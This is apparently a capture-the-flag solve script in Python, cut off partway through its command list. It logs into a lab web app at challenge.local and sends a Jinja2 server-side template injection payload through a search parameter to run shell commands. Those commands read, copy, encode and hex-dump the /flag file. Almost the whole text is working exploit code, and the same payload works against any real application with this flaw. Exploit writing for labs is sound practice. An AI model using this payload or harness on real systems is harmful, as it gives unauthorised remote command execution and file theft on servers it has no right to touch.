import requests
import urllib.parse

# Target configuration
BASE_URL = "http://challenge.local:8080"
LOGIN_URL = f"{BASE_URL}/login"
SEARCH_URL = f"{BASE_URL}/search"

# Step 1: Login to get session cookie
print("[*] Step 1: Logging in with test:test")
session = requests.Session()

login_data = {
    "username": "test",
    "password": "test"
}

login_response = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
print(f"[+] Login Status: {login_response.status_code}")
print(f"[+] Cookies after login: {dict(session.cookies)}")
print(f"[+] Login Response Length: {len(login_response.text)}B")

if login_response.status_code != 200 and login_response.status_code != 302:
    print(f"[!] Login failed with status {login_response.status_code}")
    print(f"[!] Response: {login_response.text}")
    exit(1)

# Step 2: Use SSTI RCE payload to execute commands
print("\n[*] Step 2: Executing commands via SSTI RCE")

# SSTI payload template for RCE
# {{config.__class__.__init__.__globals__['os'].popen('COMMAND').read()}}
def execute_command(cmd):
    """Execute command via SSTI RCE payload"""
    # Create SSTI payload
    payload = f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}"
    
    print(f"\n[*] Executing command: {cmd}")
    print(f"[*] Payload: {payload}")
    
    # Send payload via search parameter
    response = session.get(SEARCH_URL, params={"q": payload})
    
    print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
    print(f"[+] Full Response:")
    print(response.text)
    print("-" * 80)
    
    return response

# Step 3: Try each command in sequence to extract flag
commands = [
    "ls -la /flag",
    "ls -R /flag/",
    "head -c 20 /flag",
    "cat /flag | base64 | head -c 50",
    "cp /flag /tmp/f.txt && cat /tmp/f.txt",
    "dd if=/flag bs=1 count=30 2>/dev/null",
    "cat /flag",  # Direct read attempt
    "strings /flag",  # Try strings command
    "od -A n -t x1 /flag | head -c 100",  # Hex dump
